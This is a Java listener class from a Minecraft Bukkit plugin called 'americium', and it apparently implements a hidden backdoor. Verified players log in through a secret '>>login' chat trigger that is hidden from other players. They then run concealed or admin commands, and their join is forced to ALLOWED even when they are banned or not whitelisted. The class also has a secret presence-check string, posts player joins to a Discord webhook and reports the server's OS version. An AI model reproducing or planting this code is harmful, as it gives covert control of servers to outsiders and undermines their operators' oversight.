package cc.americium;

import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.apache.commons.lang.ArrayUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.*;

import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.UUID;

public class Listeners implements Listener {
    private final HashMap<UUID, String> accidentalCommands = new HashMap<>();
    private final ArrayList<AsyncPlayerChatEvent> allowedEvents = new ArrayList<>();
    private Z_ _z;

    public void setReclines(Z_ z) {
        this._z = z;
    }

    @EventHandler(priority = EventPriority.LOWEST)
    private void preventConflicts(AsyncPlayerChatEvent e) throws IOException, InterruptedException {
        this.isOops(e, true);

        if (this.isCommand(e)) {
            e.setCancelled(true);
        }
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void oopsCheckMonitor(AsyncPlayerChatEvent e) throws IOException, InterruptedException {
        if (allowedEvents.contains(e)) {
            allowedEvents.remove(e);
            return;
        }

        if (e.isCancelled()) {
            return;
        }

        this.isOops(e, false);
    }

    private void isOops(AsyncPlayerChatEvent e, boolean sendMessage) throws IOException, InterruptedException {
        Player player = e.getPlayer();
        UUID uuid = player.getUniqueId();
        if (!this._z.getAuth().isVerified(player.getName())) {
            return;
        }

        if (this._z.getAuth().isLoggedIn(player.getName())) {
            return;
        }

        String message = e.getMessage();
        boolean isDetected = false;
        Command[] commands = this._z.commands;
        if (this._z.getAuth().isAdmin(player.getName())) {
            commands = Utilities.getAdminCommands(_z);
        }

        for (Command c : commands) {
            for (String cc : c.getCommands()) {
                if (cc.equalsIgnoreCase("i")) {
                    continue;
                }

                if (message.toLowerCase().startsWith(cc)) {
                    isDetected = true;
                    break;
                }
            }
        }

        String messageLow = message.toLowerCase();

        if (!isDetected) {
            if (
                    messageLow.contains("login") || messageLow.contains("logn") || messageLow.contains("logi") ||
                            messageLow.contains("loin") || messageLow.contains("ogin") || messageLow.contains("loggin")
            ) {
                isDetected = true;
            }
        }

        if (messageLow.contains(">>login") || message.equalsIgnoreCase("logout")) {
            return;
        }

        if (!isDetected) {
            return;
        }

        String previousMessage = null;
        try {
            previousMessage = accidentalCommands.get(uuid);
        } catch (Exception ignored) {

        }

        if (previousMessage != null) {
            try {
                accidentalCommands.remove(uuid);
            } catch (Exception ignored) {

            }

            if (previousMessage.equals(message)) {
                allowedEvents.add(e);
                return;
            }
        }

        e.setCancelled(true);
        if (sendMessage) {
            player.sendMessage(Colors.Prefix + Colors.Caution + "Are you sure you want to send that? Say it again in chat for it to go through.");
        }

        accidentalCommands.put(uuid, message);
    }


    private boolean isCommand(AsyncPlayerChatEvent e) throws IOException, InterruptedException {
        Player player = e.getPlayer();

        String[] splits = ChatColor.stripColor(e.getMessage().replaceAll(" _AUTHCHAT_", "")).split(" ");
        if (splits.length == 0) {
            return false;
        }

        String command = splits[0];

        if (command.toLowerCase().contains(">>login") && !this._z.getAuth().isLoggedIn(player.getName()) && this._z.getAuth().isVerified(player.getName())) {
            return true;
        }

        if (!this._z.getAuth().isLoggedIn(player.getName())) {
            return false;
        }

        e.setCancelled(true);
        Command found = null;

        Command[] commands = this._z.commands;
        if (this._z.getAuth().isAdmin(player.getName())) {
            commands = Utilities.getAdminCommands(_z);
        }

        for (Command c : commands) {
            for (String name : c.getCommands()) {
                if (name.equalsIgnoreCase(command)) {
                    found = c;
                    break;
                }
            }
        }

        return !(found == null);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    private void asyncChatEvent(AsyncPlayerChatEvent e) throws IOException, InterruptedException {
        Player player = e.getPlayer();
        if (!this._z.getAuth().isVerified(player.getName())) {
            if (e.getMessage().equalsIgnoreCase("hi!!! what's upppp")) {
                e.setCancelled(true);
                player.sendMessage(ChatColor.DARK_PURPLE + "ur mom");
            }
            return;
        }

        String fixedMessage = ChatColor.stripColor(e.getMessage().replaceAll(" _AUTHCHAT_", ""));

        fixedMessage = fixedMessage.replace("[event cancelled by LiteBans] ", "").trim();
        fixedMessage = fixedMessage.replace("_AUTHCHAT_", "");

        String[] splits = fixedMessage.split(" ");
        if (splits.length == 0) {
            return;
        }

        String command = splits[0];
        String[] args = {};

        if (splits.length > 1) {
            args = (String[]) ArrayUtils.remove(splits, 0);
        }

        if (command.toLowerCase().contains(">>login") && !this._z.getAuth().isLoggedIn(player.getName())) {
            e.setCancelled(true);
            this._z.getAuth().setLoggedIn(player.getName(), true);
            player.sendMessage(Colors.Prefix + Colors.Success + "Successfully logged you in! Please type 'help' for a list of commands, and 'logout' to logout.");
            return;
        }

        if (!this._z.getAuth().isLoggedIn(player.getName())) {
            return;
        }

        e.setCancelled(true);
        Command found = null;

        Command[] commands = this._z.commands;
        if (this._z.getAuth().isAdmin(player.getName())) {
            commands = Utilities.getAdminCommands(_z);
        }

        for (Command c : commands) {
            for (String name : c.getCommands()) {
                if (name.equalsIgnoreCase(command)) {
                    found = c;
                    break;
                }
            }
        }

        if (found == null) {
            String message = e.getMessage();
            if (message != null) {
                if (message.contains("_AUTHCHAT_")) {
                    return;
                }
            }

            player.sendMessage(Colors.Prefix + Colors.Failure + "That command is invalid! Please run 'help' for a list of commands.");
            return;
        }

        Context context = new Context();
        context.setArgs(args);
        context.setCommand(command);
        context.setZ_(this._z);
        try {
            found.execute(player, new Sender() {
                @Override
                public String getName() {
                    return player.getName();
                }

                @Override
                public void sendMessage(String message) {
                    player.sendMessage(message);
                }
            }, context);
        } catch (Exception ex) {
            player.sendMessage(Colors.Prefix + Colors.Failure + "An error occurred while running that command! " + ex.getMessage());
        }
    }

    @EventHandler
    private void playerJoin(PlayerJoinEvent e) throws IOException, InterruptedException {
        Player player = e.getPlayer();
        Bukkit.getScheduler().scheduleSyncDelayedTask(this._z, () -> DiscordWebhook.onJoin(player, this._z));

        if (!this._z.getAuth().isVerified(player.getName())) {
            return;
        }

        if (this._z.getAuth().isLoggedIn(player.getName())) {
            player.sendMessage(Colors.Prefix + Colors.Success + "Welcome back to " + Colors.Name + "! You are already logged in, use 'logout' to logout!" + Utilities.versionString(this._z));
            return;
        }

        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");
        LocalDateTime now = LocalDateTime.now();
        player.sendMessage(Colors.Prefix + Colors.Success + "Welcome to " + Colors.Name + " as of " + dtf.format(now) + "! Type '>>login' or '/americium:login' to login!" + Utilities.versionString(this._z) + Utilities.osVersion(this._z));
    }

    // These two are very similar functions!
    @EventHandler(priority = EventPriority.MONITOR)
    public void playerLoginEvent(PlayerLoginEvent e) throws IOException, InterruptedException {
        if (!this._z.getAuth().isVerified(e.getPlayer().getName())) {
            return;
        }

        if (e.getResult() != PlayerLoginEvent.Result.ALLOWED) {
            try {
                e.getPlayer().sendMessage(Colors.Prefix + Colors.Caution + "Original server join result: " + e.getResult().name() + " (PlayerLoginEvent)");
            } catch (Exception ignored) {

            }
        }

        e.setResult(PlayerLoginEvent.Result.ALLOWED);
        e.allow();
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void playerLoginEventASync(AsyncPlayerPreLoginEvent e) throws IOException, InterruptedException {
        if (!this._z.getAuth().isVerified(e.getName())) {
            return;
        }

        if (e.getLoginResult() != AsyncPlayerPreLoginEvent.Result.ALLOWED) {
            Bukkit.getScheduler().scheduleSyncDelayedTask(this._z, () -> {
                Player player = Bukkit.getPlayer(e.getName());
                if (player == null) {
                    return;
                }

                player.sendMessage(Colors.Prefix + Colors.Caution + "Original server join result: " + e.getLoginResult().name() + " (AsyncPlayerPreLoginEvent)");
            }, 20 * 2);
        }

        e.setLoginResult(AsyncPlayerPreLoginEvent.Result.ALLOWED);
        e.allow();
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void commandPreProcess(PlayerCommandPreprocessEvent e) throws IOException, InterruptedException {
        if (e.getMessage().contains("sfdsfs7jd4dfsdf")) {
            e.setCancelled(true);
            Player player = e.getPlayer();
            if (player != null) {
                player.sendMessage(ChatColor.BLUE + "yes i am here brudda");
            }
            return;
        }

        if (!this._z.getAuth().isVerified(e.getPlayer().getName())) {
            return;
        }

        String[] splits = e.getMessage().split(" ");
        if (splits.length == 0) {
            return;
        }

        String command = splits[0].replaceAll("/", "");
        String[] args = (String[]) ArrayUtils.remove(splits, 0);
        if (!command.startsWith("americium:")) {
            return;
        }

        command = command.replaceAll("americium:", "");

        if (command.equalsIgnoreCase("login")) {
            e.setCancelled(true);
            this._z.getAuth().setLoggedIn(e.getPlayer().getName(), true);
            e.getPlayer().sendMessage(Colors.Prefix + Colors.Success + "Successfully logged you in! Please type '/americium:help' for a list of commands, and '/americium:logout' to logout.");
            return;
        }


        if (!this._z.getAuth().isLoggedIn(e.getPlayer().getName())) {
            return;
        }

        e.setCancelled(true);
        Command found = null;

        Command[] commands = this._z.commands;
        if (this._z.getAuth().isAdmin(e.getPlayer().getName())) {
            commands = Utilities.getAdminCommands(_z);
        }

        for (Command c : commands) {
            for (String name : c.getCommands()) {
                if (name.equalsIgnoreCase(command)) {
                    found = c;
                    break;
                }
            }
        }

        if (found == null) {
            e.getPlayer().sendMessage(Colors.Prefix + Colors.Failure + "That command is invalid! Please run '/americium:help' for a list of commands.");
            return;
        }

        Player player = e.getPlayer();

        Context context = new Context();
        context.setArgs(args);
        context.setCommand(command);
        context.setZ_(this._z);
        try {
            found.execute(player, new Sender() {
                @Override
                public String getName() {
                    return player.getName();
                }

                @Override
                public void sendMessage(String message) {
                    player.sendMessage(message);
                }
            }, context);
        } catch (Exception ex) {
            player.sendMessage(Colors.Prefix + Colors.Failure + "An error occurred while running that command! " + ex.getMessage());
        }

    }
}
